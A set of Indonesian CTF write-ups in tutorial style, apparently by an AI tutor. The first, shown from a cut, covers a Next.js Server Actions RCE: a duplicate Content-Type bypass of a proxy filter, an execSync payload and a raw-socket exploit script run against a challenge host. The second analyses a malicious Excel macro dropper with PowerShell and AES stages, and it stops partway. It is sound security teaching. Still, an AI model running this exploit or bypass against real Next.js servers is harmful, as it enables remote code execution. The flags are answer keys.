> Server Action seperti tombol khusus yang langsung memanggil pegawai di kantor belakang. Kalau mekanismenya rusak, kita bisa membuat pegawai itu melakukan hal yang tidak seharusnya.

Jadi dari fase recon, fokus kita berubah dari:

```text
"Cari flag di HTML"
```

menjadi:

```text
"Cari apakah Server Action bisa disalahgunakan"
```

---

# 2. Source Code Review — Membaca Petunjuk dari File Challenge

## Temuan penting

Dari source challenge, dependency menunjukkan aplikasi memakai versi yang menarik:

```json
"react": "19.0.0",
"react-dom": "19.0.0",
"next": "16.0.6",
"react-server-dom-webpack": "19.0.0"
```

Ini langsung menjadi red flag karena versi tersebut cocok dengan jalur vulnerability React Server Components / Server Actions.

## Mindset-nya

Saat melihat dependency, pertanyaan yang kita tanyakan adalah:

```text
1. Framework apa yang dipakai?
2. Versinya berapa?
3. Apakah versi itu punya vulnerability terkenal?
4. Apakah challenge description mendukung arah itu?
```

Challenge description:

```text
What could go wrong with my website?
```

Kalimat ini pendek, tapi biasanya dalam CTF berarti:

> “Website terlihat normal, tapi ada kesalahan di teknologi/framework yang dipakai.”

---

# 3. Flag Discovery — Membedakan Flag Palsu dan Flag Asli

Di source terdapat `flag.txt`, tetapi dalam challenge seperti ini, file itu bisa saja decoy.

Petunjuk yang lebih penting adalah adanya binary:

```bash
/readflag
```

Binary ini biasanya dibuat dengan permission khusus agar bisa membaca flag asli.

## Kenapa bukan langsung `cat flag.txt`?

Karena dalam banyak CTF berbasis Docker:

* `flag.txt` di source bisa fake
* flag asli dimount saat container berjalan
* hanya program khusus seperti `/readflag` yang boleh membaca flag asli

Analogi:

> `flag.txt` di source itu seperti peta palsu yang sengaja ditaruh di meja.
> `/readflag` adalah kunci brankas yang benar.
> Kalau kita cuma baca peta palsu, kita tidak sampai ke harta. Tapi kalau kita bisa memakai kuncinya, brankas terbuka.

Maka target command kita adalah:

```bash
/readflag
```

---

# 4. Vulnerability Analysis — Kenapa Server Bisa Menjalankan Command?

## Konsep RCE

RCE adalah singkatan dari:

```text
Remote Code Execution
```

Artinya kita bisa membuat server menjalankan perintah dari jarak jauh.

Dalam challenge ini, bug berada pada cara React Server Components memproses payload tertentu. Payload yang dibentuk dengan struktur khusus dapat membuat server mengevaluasi bagian tertentu dari request.

Secara sederhana:

> Server seharusnya hanya menerima isi form.
> Tapi karena parser-nya bermasalah, request yang terlihat seperti form bisa menyelipkan instruksi khusus.

---

# 5. Obstacle — Proxy Filter di Depan Aplikasi

Saat menganalisis source, ada proxy Python di depan Next.js. Proxy ini mencoba memblokir input berbahaya dengan mencari kata:

```text
proto
```

Ini penting karena payload React Server Components sering memakai pola:

```text
__proto__
```

Jadi payload standar bisa gagal karena diblokir.

## Analogi

> Kita mau mengirim paket ke kantor.
> Di depan kantor ada satpam yang memeriksa tulisan di paket.
> Kalau ada kata “proto”, paket langsung dibuang.

Artinya kita butuh bypass. Bukan karena payload-nya salah, tetapi karena ada penjaga tambahan sebelum request sampai ke aplikasi.

---

# 6. Bypass Strategy — Duplicate `Content-Type`

Bypass yang digunakan adalah mengirim dua header `Content-Type`:

```http
Content-Type: text/plain
Content-Type: multipart/form-data; boundary=...
```

## Kenapa ini bekerja?

Karena proxy dan upstream Next.js bisa membaca header duplicate dengan cara berbeda.

Kemungkinan alurnya:

```text
Proxy membaca Content-Type pertama:
→ text/plain
→ body tidak dianggap form multipart
→ filter tidak memeriksa payload seperti form

Next.js membaca Content-Type kedua:
→ multipart/form-data
→ payload diproses sebagai Server Action multipart
```

## Analogi

> Paket punya dua label.
> Label pertama dibaca satpam: “Ini cuma kertas biasa.”
> Satpam membiarkan lewat.
> Label kedua dibaca pegawai di dalam: “Ini formulir resmi, saya proses.”
> Akhirnya isi paket tetap diproses oleh sistem.

Inilah alasan kita tidak memakai `requests.post()` biasa, karena library HTTP normal biasanya merapikan header dan tidak nyaman untuk mengirim duplicate header secara mentah.

---

# 7. Exploitation — Validasi RCE dengan Command `id`

Sebelum mengambil flag, kita test dulu dengan command ringan:

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ id
```

Output:

```text
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

## Kenapa test `id` dulu?

Karena `id` adalah command aman untuk membuktikan bahwa server benar-benar menjalankan perintah kita.

Analogi:

> Sebelum membuka brankas, kita ketuk pintunya dulu.
> Kalau ada suara dari dalam, berarti jalurnya benar.

Dengan output `uid=1001(ctf)`, kita tahu:

```text
1. Payload berhasil diproses
2. Command berhasil dieksekusi
3. Server menjalankan command sebagai user ctf
4. Jalur RCE valid
```

---

# 8. Flag Extraction — Menjalankan `/readflag`

Setelah RCE terbukti, kita jalankan:

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ /readflag
```

Output mentah dari response:

```http
X-Action-Redirect: http://x/Q0JDezZjYzZhYmRmMjRiMmVjZTc5MWNmZjljNzVmNWZkZGRifQ==;push
```

Bagian ini:

```text
Q0JDezZjYzZhYmRmMjRiMmVjZTc5MWNmZjljNzVmNWZkZGRifQ==
```

adalah base64.

Setelah decode:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

Final flag:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

---

# 9. Python Exploit Dissection

Sekarang kita bedah script-nya dengan cara sederhana.

## Bagian 1 — Import library

```python
import base64
import json
import socket
import ssl
import sys
from urllib.parse import urlparse
```

Fungsinya:

| Library    | Fungsi                               |
| ---------- | ------------------------------------ |
| `base64`   | Decode hasil command dari header     |
| `json`     | Membuat payload JSON yang valid      |
| `socket`   | Mengirim HTTP request manual         |
| `ssl`      | Membungkus koneksi dengan HTTPS      |
| `sys`      | Membaca argumen command line         |
| `urlparse` | Memecah URL menjadi host, port, path |

Kenapa pakai `socket`, bukan `requests`?

Karena kita perlu mengirim request mentah dengan dua `Content-Type`.

Analogi:

> `requests` seperti kurir profesional yang merapikan paketmu.
> `socket` seperti kamu mengantar paket sendiri, jadi kamu bisa menaruh label persis sesuai kebutuhan challenge.

---

## Bagian 2 — Target dan command

```python
TARGET = "https://northstar.cbd2026.cloud/"
CMD = "/readflag"

if len(sys.argv) > 1:
    TARGET = sys.argv[1]
if len(sys.argv) > 2:
    CMD = " ".join(sys.argv[2:])
```

Artinya:

* Kalau tidak memberi argumen, script otomatis memakai target dan command default.
* Kalau memberi argumen, kita bisa ganti command.

Contoh test:

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ id
```

Contoh ambil flag:

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ /readflag
```

---

## Bagian 3 — Parsing URL

```python
url = urlparse(TARGET)
host = url.hostname
port = url.port or (443 if url.scheme == "https" else 80)
path = url.path or "/"
```

Bagian ini memecah URL:

```text
https://northstar.cbd2026.cloud/
```

menjadi:

```text
scheme = https
host   = northstar.cbd2026.cloud
port   = 443
path   = /
```

Analogi:

> Kalau URL adalah alamat rumah lengkap, `urlparse` memecahnya menjadi nama jalan, nomor rumah, dan pintu yang dituju.

---

## Bagian 4 — Boundary multipart

```python
boundary = "----NorthstarBoundary"
```

`boundary` adalah pembatas antar bagian dalam request multipart.

Analogi:

> Kalau request multipart adalah kotak makan, boundary adalah sekat antara nasi, lauk, dan sayur.
> Server butuh sekat ini supaya tahu bagian mana yang sedang dibaca.

---

## Bagian 5 — Payload JavaScript

Secara konsep, payload melakukan ini:

```javascript
process.mainModule.require('child_process').execSync(CMD)
```

Artinya server diminta menjalankan command.

Lalu output command diubah ke base64:

```javascript
Buffer.from(output).toString('base64')
```

Kenapa base64?

Karena output command bisa mengandung newline atau karakter yang tidak aman untuk header HTTP.

Analogi:

> Base64 itu seperti membungkus barang pecah belah dengan bubble wrap.
> Isinya tetap sama, tapi lebih aman dikirim lewat jalur yang sempit seperti header.

---

## Bagian 6 — Mengirim output lewat redirect

Payload membuat error khusus:

```javascript
NEXT_REDIRECT
```

Lalu hasil command dimasukkan ke URL redirect:

```text
http://x/<base64-output>
```

Maka response server memiliki header:

```http
X-Action-Redirect: http://x/<base64-output>;push
```

Kenapa pakai redirect?

Karena ini cara praktis untuk “memaksa” server mengembalikan data command lewat header.

Analogi:

> Kita minta server menulis jawaban di alamat tujuan pengiriman.
> Alamatnya palsu, tapi isi alamat itu membawa pesan rahasia.

---

## Bagian 7 — Membuat body multipart

Body request memiliki dua part:

```text
name="0"
name="1"
```

Secara konsep:

* Part `0` membawa payload utama
* Part `1` memicu pemrosesan payload

Analogi:

> Part `0` adalah surat instruksi.
> Part `1` adalah tombol “baca surat ini sekarang”.

---

## Bagian 8 — Membuat HTTP request manual

Script membangun request seperti ini:

```http
POST / HTTP/1.1
Host: northstar.cbd2026.cloud
Next-Action: x
Content-Type: text/plain
Content-Type: multipart/form-data; boundary=----NorthstarBoundary
Content-Length: ...
Connection: close
```

Header penting:

```http
Next-Action: x
```

Ini memberi tahu Next.js bahwa request ini terkait Server Action.

Header bypass:

```http
Content-Type: text/plain
Content-Type: multipart/form-data; boundary=...
```

Ini inti bypass proxy.

---

## Bagian 9 — SSL self-signed fix

Awalnya kamu mendapat error:

```text
certificate verify failed: self-signed certificate
```

Itu karena sertifikat HTTPS target CTF self-signed.

Perbaikannya:

```python
ctx = ssl._create_unverified_context()
sock = ctx.wrap_socket(sock, server_hostname=host)
```

Artinya Python tidak memverifikasi sertifikat.

Analogi:

> Di lab CTF, kartu identitas server dibuat sendiri oleh panitia.
> Python awalnya bilang “aku tidak percaya kartu ini.”
> Untuk lab ini saja, kita bilang “tidak apa-apa, lanjutkan.”

Catatan penting: ini boleh untuk private lab CTF, tapi tidak bagus untuk aplikasi produksi.

---

## Bagian 10 — Membaca response dan decode output

Script mencari header:

```http
X-Action-Redirect
```

Lalu mengambil bagian setelah:

```text
http://x/
```

Kemudian decode base64:

```python
output = base64.b64decode(encoded).decode(errors="replace")
```

Itulah kenapa output akhirnya muncul rapi:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

---

# 10. Full Attack Flow

```text
[1] Buka website
    ↓
[2] Lihat DevTools / source
    ↓
[3] Temukan Next.js + ServerActionForm
    ↓
[4] Cek dependency: React 19.0.0 + Next 16.0.6
    ↓
[5] Curiga React Server Components RCE
    ↓
[6] Cek Docker/source: ada /readflag
    ↓
[7] Sadari payload standar diblokir proxy karena kata "proto"
    ↓
[8] Pakai duplicate Content-Type untuk bypass proxy
    ↓
[9] Kirim payload RSC via raw socket
    ↓
[10] Test command: id
    ↓
[11] RCE confirmed sebagai user ctf
    ↓
[12] Jalankan /readflag
    ↓
[13] Ambil output dari X-Action-Redirect
    ↓
[14] Decode base64
    ↓
[15] Flag didapat
```

---

# 11. Commands Used

## Test RCE

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ id
```

Output:

```text
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

## Read Flag

```bash
python3 solve_northstar.py https://northstar.cbd2026.cloud/ /readflag
```

Output:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

---

# 12. Why This Worked

Challenge ini berhasil diselesaikan karena tiga hal bertemu:

## 1. Aplikasi memakai versi rentan

Next.js dan React Server Components berada pada versi yang bisa dieksploitasi melalui payload Server Action khusus.

## 2. Ada server-side execution path

Server Action memberi jalur dari client menuju fungsi server.

## 3. Filter proxy tidak cukup kuat

Proxy hanya melakukan blokir string sederhana terhadap kata `proto`. Filter seperti ini mudah dilewati jika parsing antara proxy dan backend tidak konsisten.

Analogi final:

> Website adalah gedung.
> Server Action adalah pintu pegawai.
> Vulnerability adalah kunci palsu yang diterima pintu itu.
> Proxy adalah satpam yang hanya membaca label pertama.
> Duplicate Content-Type adalah trik dua label.
> `/readflag` adalah brankas.
> Base64 adalah amplop yang membawa isi brankas kembali ke kita.

---

# 13. Security Lessons Learned

## Untuk developer

Jangan hanya mengandalkan filter kata seperti:

```text
proto
```

Karena attacker bisa memanfaatkan perbedaan parsing, encoding, atau header behavior.

## Best practices

1. **Update dependency segera**
   Framework seperti Next.js dan React harus dipatch jika ada advisory security.

2. **Reject duplicate sensitive headers**
   Header seperti `Content-Type`, `Host`, `Authorization`, dan sejenisnya harus dinormalisasi.

3. **Samakan parsing proxy dan backend**
   Proxy dan aplikasi backend harus membaca request dengan cara yang konsisten.

4. **Jangan expose SUID helper di production**
   `/readflag` memang normal untuk CTF, tapi konsep binary SUID sangat berisiko di sistem nyata.

5. **Gunakan allowlist, bukan blocklist sederhana**
   Jangan hanya blokir kata tertentu. Validasi struktur request secara ketat.

---

# 14. Final Result

```text
Flag: CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

## Key Takeaway

CTF ini bukan sekadar “jalanin exploit”. Alur berpikir utamanya adalah:

```text
Kenali teknologi → cek versi → pahami jalur server-side → temukan proteksi → cari mismatch parsing → validasi RCE → ambil flag
```

Itulah pola berpikir CTF Web yang penting untuk kamu kuasai, Reylucha Biel.



## CHAT 19
# CTF Reverse Engineering Writeup - Office

## Detail Ringkas CTF

```text
Challenge Name : Office
Category       : Reverse Engineering / Office Macro Analysis
Password       : lunashci
Description    : We've set up a simple Excel spreadsheet with a "salary guessing game" —
                 it's a bit of fun to see who knows what everyone makes. But here's the catch:
                 there's a special hidden gift inside for someone very specific.
Final Flag     : CBC{b3w4r3_h1dd3n_m4cr0s}
```

---

# 1. Executive Summary

Challenge **Office** memberikan sebuah file spreadsheet Excel yang terlihat seperti game sederhana untuk menebak gaji. Namun, setelah dianalisis, file ini bukan spreadsheet biasa. File tersebut adalah workbook Excel macro-enabled yang menyimpan payload tersembunyi di dalam sheet `veryHidden`.

Alur utamanya:

```text
Office.zip
  ↓
Game.7z
  ↓
Game.xlsm
  ↓
VBA Macro
  ↓
Hidden Sheet "Data"
  ↓
Encoded PowerShell
  ↓
Environment Check
  ↓
AES Decryption
  ↓
.NET Assembly
  ↓
Registry/FlagPart1 Validation
  ↓
Generated flag.png
  ↓
Final Flag
```

Flag akhir:

```text
CBC{b3w4r3_h1dd3n_m4cr0s}
```

---

# 2. Mindset Awal

Saat membaca deskripsi challenge:

> “simple Excel spreadsheet with a salary guessing game”

Aku langsung berpikir:

```text
Ini kemungkinan file Office.
Kalau file Office, cek apakah ada macro.
Kalau ada macro, jangan langsung dibuka normal.
Analisis secara statis dulu.
```

Kenapa begitu?

Karena dalam reverse engineering, **kita jangan percaya tampilan luar file**. Banyak file kelihatan seperti dokumen biasa, padahal isinya script tersembunyi.

Analogi mudah:

> Seperti menerima kotak hadiah. Dari luar tertulis “permen”, tapi sebelum dibuka kita kocok dulu, lihat beratnya, cek apakah ada suara aneh. Jangan langsung dimakan.

Dalam challenge ini, spreadsheet terlihat seperti game tebak gaji, tapi sebenarnya menyimpan “hidden gift” untuk orang tertentu.

---

# 3. Checkpoint 1 — Triage File

## Tujuan

Mengetahui jenis file dan struktur awalnya.

## Langkah

File awal adalah:

```text
Office.zip
```

Setelah diekstrak, ditemukan:

```text
Game.7z
```

Lalu setelah dibuka, ditemukan:

```text
Game.xlsm
```

Ekstensi `.xlsm` adalah petunjuk besar.

```text
.xlsm = Excel Macro-Enabled Workbook
```

Artinya file Excel ini bisa berisi macro VBA.

## Cara Berpikir

Kalau file adalah `.xlsx`, biasanya hanya spreadsheet biasa.
Kalau file adalah `.xlsm`, maka ada kemungkinan script macro yang bisa berjalan otomatis.

Analogi:

> `.xlsx` itu seperti buku catatan biasa.
> `.xlsm` itu seperti buku catatan yang punya tombol rahasia. Kalau tombol itu ditekan, sesuatu bisa berjalan otomatis.

## Kesimpulan Checkpoint

Kita tidak fokus ke data spreadsheet dulu. Kita fokus mencari macro.

---

# 4. Checkpoint 2 — Mencari Macro VBA

## Tujuan

Menemukan script tersembunyi yang menjadi pintu masuk challenge.

Di dalam workbook ditemukan macro utama:

```vb
Private Sub Workbook_Open()
    ...
End Sub
```

Bagian `Workbook_Open()` sangat penting.

Kenapa?

Karena macro ini akan berjalan otomatis saat workbook dibuka.

Analogi:

> Seperti pintu otomatis di minimarket. Begitu kamu masuk, pintunya langsung terbuka sendiri.
> `Workbook_Open()` juga begitu: begitu file Excel dibuka, macro langsung berjalan.

## Temuan Penting

Macro tersebut mengambil data dari sheet tertentu:

```vb
Set oWs = ThisWorkbook.Sheets(sNm)
```

Lalu membaca beberapa cell:

```vb
sA = oWs.Cells(rB, &H4000).Value
sB = oWs.Cells(rB + 1, &H4000).Value
sC = oWs.Cells(rB + 2, &H4000).Value
```

Nilai `&H4000` dalam desimal adalah:

```text
16384
```

Kolom ke-16384 di Excel adalah:

```text
XFD
```

Itu adalah kolom terakhir Excel.

## Cara Berpikir

Kalau macro membaca cell yang sangat jauh seperti `XFD1048570`, kemungkinan besar data itu sengaja disembunyikan.

Analogi:

> Kalau seseorang mau menyembunyikan kunci, dia tidak menaruhnya di meja depan. Dia taruh di pojok gudang paling belakang, di bawah kardus yang jarang dibuka.

## Kesimpulan Checkpoint

Payload tidak terlihat di cell normal. Payload disembunyikan di ujung spreadsheet.

---

# 5. Checkpoint 3 — Menemukan Sheet `veryHidden`

## Tujuan

Mencari lokasi data yang dipakai macro.

Workbook memiliki sheet bernama:

```text
Data
```

Namun status sheet tersebut adalah:

```text
veryHidden
```

Di Excel, ada dua jenis hidden:

```text
Hidden      = masih bisa dimunculkan lewat menu Excel biasa
VeryHidden  = tidak bisa dimunculkan lewat UI biasa
```

## Cara Berpikir

Deskripsi challenge berkata:

> “special hidden gift inside”

Kata `hidden` di deskripsi cocok dengan sheet yang dibuat `veryHidden`.

Analogi:

> `Hidden` itu seperti barang disimpan di laci.
> `VeryHidden` itu seperti lacinya dikunci, lalu kuncinya disembunyikan di ruangan lain.

## Kesimpulan Checkpoint

Sheet `Data` adalah lokasi utama payload tersembunyi.

---

# 6. Checkpoint 4 — Macro Menjalankan PowerShell

## Tujuan

Memahami apa yang dilakukan macro setelah membaca data dari hidden sheet.

Macro menyusun command seperti ini:

```text
powershell.exe -WindowStyle Hidden -EncodedCommand <payload>
```

Bagian pentingnya:

```text
-EncodedCommand
```

PowerShell `-EncodedCommand` biasanya berisi command dalam bentuk Base64 dengan encoding UTF-16LE.

## Cara Berpikir

Kalau menemukan `EncodedCommand`, jangan langsung berpikir itu enkripsi kuat. Biasanya itu hanya encoding.

Encoding bukan encryption.

```text
Encoding   = membungkus data supaya bentuknya berubah
Encryption = mengunci data dengan kunci rahasia
```

Analogi:

> Encoding itu seperti menulis pesan dengan huruf terbalik. Siapa pun yang tahu caranya bisa membalik lagi.
> Encryption itu seperti memasukkan pesan ke brankas yang butuh kunci.

## Kesimpulan Checkpoint

Kita perlu mengambil payload dari cell tersembunyi, menggabungkannya, lalu decode Base64 UTF-16LE.

---

# 7. Checkpoint 5 — Decode PowerShell Stage Pertama

## Tujuan

Membuka isi PowerShell yang disembunyikan oleh macro.

Setelah payload digabung dan didecode, muncul PowerShell baru yang memuat helper C#.

Di dalamnya ada beberapa fungsi penting:

```csharp
LsXxaQ(...)
Pia2wRPUo4iX(...)
HUzqMxVCPuxJ(...)
```

Fungsi yang paling penting adalah fungsi decrypt:

```csharp
HUzqMxVCPuxJ(...)
```

Fungsi ini memakai AES:

```text
Algorithm : AES
Mode      : CBC
Key       : SHA256(password)
IV        : 16 null bytes
Padding   : PKCS7
```

## Cara Berpikir

Begitu menemukan fungsi decrypt, kita tahu bahwa payload berikutnya terkunci. Maka fokus kita berubah:

```text
Dari "mencari payload"
menjadi "mencari password untuk decrypt payload"
```

Analogi:

> Kita sudah menemukan peti harta. Tapi petinya terkunci. Sekarang tugas kita bukan mencari peti lagi, melainkan mencari kuncinya.

## Kesimpulan Checkpoint

Challenge ini multi-stage. Setiap stage membuka stage berikutnya.

---

# 8. Checkpoint 6 — Environment Check: COMPUTERNAME

## Tujuan

Mencari siapa target spesifik yang dimaksud challenge.

PowerShell membaca nama komputer:

```powershell
$hostname = $env:COMPUTERNAME
```

Lalu membandingkannya dengan nilai tertentu:

```text
A045A54E5737EF
```

Ada juga nilai lain:

```text
FB11FE0C146FAC
```

Dengan membalik fungsi obfuscation, ditemukan bahwa computer name yang benar adalah:

```text
WORK-PC
```

Verifikasi:

```text
LsXxaQ("WORK-PC", 0xDEADBEEF)      = A045A54E5737EF
Pia2wRPUo4iX("WORK-PC", 0xCAFEBABE) = FB11FE0C146FAC
```

## Cara Berpikir

Deskripsi berkata:

> “for someone very specific”

Jadi aku mencari syarat yang membuat payload hanya berjalan untuk target tertentu. Ternyata syarat pertama adalah nama komputer.

Analogi:

> Hadiah ini seperti paket yang hanya boleh dibuka di alamat tertentu. Kalau alamat rumahnya bukan `WORK-PC`, paket tidak akan terbuka.

## Kesimpulan Checkpoint

Target environment pertama:

```text
COMPUTERNAME = WORK-PC
```

---

# 9. Checkpoint 7 — Decrypt Payload Berikutnya dengan Key dari COMPUTERNAME

## Tujuan

Membuka stage berikutnya setelah menemukan computer name.

Setelah menemukan `WORK-PC`, kita mendapatkan key:

```text
FB11FE0C146FAC
```

Key ini dipakai untuk decrypt payload yang ada di hidden sheet:

```text
Data!XFD1048573
```

Hasil decrypt adalah PowerShell stage berikutnya.

## Cara Berpikir

Karena challenge memakai sistem bertingkat, setiap jawaban biasanya menjadi kunci untuk pintu berikutnya.

Analogi:

> Di escape room, kunci lemari pertama biasanya bukan langsung membuka pintu keluar. Kunci itu membuka laci lain yang berisi petunjuk berikutnya.

## Kesimpulan Checkpoint

Computer name bukan flag, tetapi kunci untuk membuka payload lanjutan.

---

# 10. Checkpoint 8 — Environment Check: USERNAME

## Tujuan

Menemukan target user yang dimaksud.

Stage berikutnya membaca username Windows:

```powershell
$env:USERNAME
```

Nilai yang dicocokkan:

```text
FDDE36E35BFC28
```

Dengan membalik fungsi obfuscation yang sama, username yang benar adalah:

```text
Fischer
```

Verifikasi:

```text
Pia2wRPUo4iX("Fischer", 0xCAFEBABE) = FDDE36E35BFC28
```

## Cara Berpikir

Kalau sudah ada check `COMPUTERNAME`, biasanya ada check lain seperti:

```text
USERNAME
DOMAIN
OS Version
Registry
Current path
```

Jadi aku lanjut mencari environment check berikutnya.

Analogi:

> Paket tadi bukan cuma harus dikirim ke rumah tertentu, tapi juga harus diterima oleh orang tertentu. Rumahnya `WORK-PC`, penerimanya `Fischer`.

## Kesimpulan Checkpoint

Target environment lengkap:

```text
COMPUTERNAME = WORK-PC
USERNAME     = Fischer
```

---

# 11. Checkpoint 9 — Decrypt Payload dengan Username

## Tujuan

Membuka stage berikutnya menggunakan username yang benar.

Payload berikutnya didecrypt memakai:

```text
Fischer
```

Payload berasal dari cell tersembunyi:

```text
Data!XFD1048574
```

Setelah didecrypt, muncul logic baru yang mengambil beberapa potongan data besar:

```text
Data!XFD1048560
Data!XFD1048561
Data!XFD1048562
Data!XFD1048563
```

Potongan-potongan ini digabung, lalu didecrypt memakai:

```text
WORK-PC
```

Hasilnya adalah:

```text
.NET Assembly
```

## Cara Berpikir

Kalau payload berubah dari script menjadi binary atau assembly, berarti level challenge naik. Kita tidak cukup hanya membaca PowerShell. Kita harus reverse engineering payload final.

Analogi:

> Awalnya kita membaca catatan kertas. Setelah itu, kita menemukan mesin kecil. Sekarang kita harus membongkar mesin itu untuk tahu cara kerjanya.

## Kesimpulan Checkpoint

Payload final adalah program `.NET`, bukan sekadar script.

---

# 12. Checkpoint 10 — Analisis .NET Assembly

## Tujuan

Memahami cara payload final menghasilkan flag.

Di dalam assembly, ditemukan class dan method yang dijalankan oleh PowerShell:

```text
Class  : nksCTGRr
Method : emcbDe4wAa()
```

Assembly ini melakukan beberapa hal:

```text
1. Mengecek COMPUTERNAME
2. Mengecek USERNAME
3. Membaca registry
4. Memvalidasi FlagPart1
5. Menghasilkan flag.png
```

Registry yang dibaca:

```text
HKCU\SOFTWARE\CTFChallenge
Value: FlagPart1
```

## Cara Berpikir

Saat melihat registry `FlagPart1`, aku langsung sadar:

```text
Flag kemungkinan dipecah menjadi beberapa bagian.
```

Nama `FlagPart1` memberi tahu bahwa ini adalah bagian pertama flag.

Analogi:

> Kalau kamu menemukan kertas bertuliskan “Password Part 1”, berarti password lengkapnya belum selesai. Masih ada bagian lain.

## Kesimpulan Checkpoint

Flag tidak disimpan langsung dalam satu tempat. Ada minimal dua bagian.

---

# 13. Checkpoint 11 — Recover `FlagPart1`

## Tujuan

Mengambil bagian pertama flag dari logic validasi.

Assembly membentuk string dengan format:

```text
WORK-PC:Fischer:CBC2026:<FlagPart1>
```

Lalu string tersebut diproses dan dibandingkan dengan expected bytes.

Dengan membalik proses transformasi, hasil plaintext-nya adalah:

```text
WORK-PC:Fischer:CBC2026:CBC{b3w4r3
```

Maka:

```text
FlagPart1 = CBC{b3w4r3
```

## Cara Berpikir

Kita tidak perlu benar-benar menjalankan program di environment asli. Kita bisa baca logic-nya, pahami transformasinya, lalu balik prosesnya.

Analogi:

> Kalau penjaga pintu menyimpan hasil akhir dari sebuah rumus, kita tidak perlu menebak semua kemungkinan. Kalau rumusnya bisa dibalik, kita hitung mundur saja.

## Kesimpulan Checkpoint

Bagian pertama flag:

```text
CBC{b3w4r3
```

---

# 14. Checkpoint 12 — Generate dan Membaca `flag.png`

## Tujuan

Mendapatkan bagian kedua flag.

Setelah `FlagPart1` benar, assembly menghasilkan file:

```text
flag.png
```

Gambar tersebut berisi:

```text
_h1dd3n_m4cr0s}
```

Hal penting: bagian ini sempat mudah salah baca.

Yang benar:

```text
h1dd3n
```

Bukan:

```text
hidd3n
```

Perbedaannya:

```text
1 = angka satu
i = huruf i
```

## Cara Berpikir

Ketika flag pertama salah saat submit, aku tidak langsung menganggap seluruh alur salah. Aku cek kemungkinan paling kecil dulu:

```text
Apakah ada salah baca karakter?
Apakah 1 terbaca i?
Apakah 0 terbaca O?
Apakah l terbaca 1?
```

Di CTF, salah satu karakter saja membuat flag invalid.

Analogi:

> Kalau PIN ATM adalah `123456`, lalu kamu masukkan `I23456`, tetap salah walaupun terlihat mirip.

## Kesimpulan Checkpoint

Bagian kedua flag:

```text
_h1dd3n_m4cr0s}
```

---

# 15. Checkpoint 13 — Menggabungkan Flag

Bagian pertama:

```text
CBC{b3w4r3
```

Bagian kedua:

```text
_h1dd3n_m4cr0s}
```

Gabungan final:

```text
CBC{b3w4r3_h1dd3n_m4cr0s}
```

---

# 16. Python Helper Script

Dalam challenge seperti ini, Python bukan dipakai untuk menyerang sistem luar. Python dipakai sebagai **alat bantu reverse engineering lokal**, misalnya untuk decode Base64, decrypt AES, dan membalik transformasi sederhana.

Contoh struktur helper script:

```python
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


def decode_powershell_encoded_command(encoded_command: str) -> str:
    raw = base64.b64decode(encoded_command)
    return raw.decode("utf-16le")


def aes_decrypt_base64(ciphertext_b64: str, password: str) -> bytes:
    key = hashlib.sha256(password.encode()).digest()
    iv = b"\x00" * 16

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext_b64)

    return unpad(cipher.decrypt(ciphertext), AES.block_size)


def xor_decode(values, key):
    return "".join(chr(v ^ key) for v in values)


# Example:
# sheet_name = xor_decode([75, 110, 123, 110], 0x0F)
# print(sheet_name)
```

## Bedah Script

### 1. Import Library

```python
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
```

Kenapa butuh ini?

```text
base64  → membuka PowerShell EncodedCommand
hashlib → membuat SHA256(password)
AES     → decrypt payload
unpad   → menghapus padding PKCS7 setelah decrypt
```

Analogi:

> Ini seperti membawa alat tukang.
> `base64` adalah pembuka amplop.
> `AES` adalah pembuka gembok.
> `hashlib` adalah mesin pembuat kunci.
> `unpad` adalah gunting untuk merapikan busa pelindung di dalam paket.

---

### 2. Decode PowerShell

```python
def decode_powershell_encoded_command(encoded_command: str) -> str:
    raw = base64.b64decode(encoded_command)
    return raw.decode("utf-16le")
```

PowerShell `-EncodedCommand` memakai UTF-16LE, bukan UTF-8 biasa.

Kenapa penting?

Kalau salah encoding, hasilnya bisa terlihat rusak.

Analogi:

> Seperti membaca buku Jepang pakai kamus Inggris. Hurufnya ada, tapi artinya kacau.

---

### 3. AES Decrypt

```python
def aes_decrypt_base64(ciphertext_b64: str, password: str) -> bytes:
    key = hashlib.sha256(password.encode()).digest()
    iv = b"\x00" * 16

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext_b64)

    return unpad(cipher.decrypt(ciphertext), AES.block_size)
```

Script ini mengikuti logic C# di PowerShell:

```text
Key = SHA256(password)
IV  = 16 null bytes
Mode = CBC
Padding = PKCS7
```

Kenapa password di-hash dulu?

Karena AES butuh panjang key tertentu. SHA256 menghasilkan 32 byte, cocok untuk AES-256.

Analogi:

> Password `Fischer` itu seperti bahan mentah. SHA256 mengubahnya menjadi bentuk kunci yang ukurannya pas untuk gembok AES.

---

### 4. XOR Decode

```python
def xor_decode(values, key):
    return "".join(chr(v ^ key) for v in values)
```

Macro menyembunyikan string seperti `Data`, `powershell.exe`, dan parameter command menggunakan XOR.

XOR ini reversible.

Artinya:

```text
encoded XOR key = decoded
decoded XOR key = encoded
```

Analogi:

> XOR itu seperti saklar lampu. Kalau ditekan sekali, lampu berubah. Kalau ditekan lagi dengan cara yang sama, balik seperti semula.

---

# 17. Attack Plan versi Sederhana

Kalau dibuat seperti strategi detektif:

```text
1. Lihat jenis file
   ↓
2. Curiga karena .xlsm
   ↓
3. Cari macro
   ↓
4. Temukan Workbook_Open()
   ↓
5. Lihat macro membaca hidden sheet
   ↓
6. Temukan sheet Data veryHidden
   ↓
7. Ambil payload dari cell paling ujung
   ↓
8. Decode PowerShell
   ↓
9. Cari environment check
   ↓
10. Recover COMPUTERNAME = WORK-PC
   ↓
11. Decrypt stage berikutnya
   ↓
12. Recover USERNAME = Fischer
   ↓
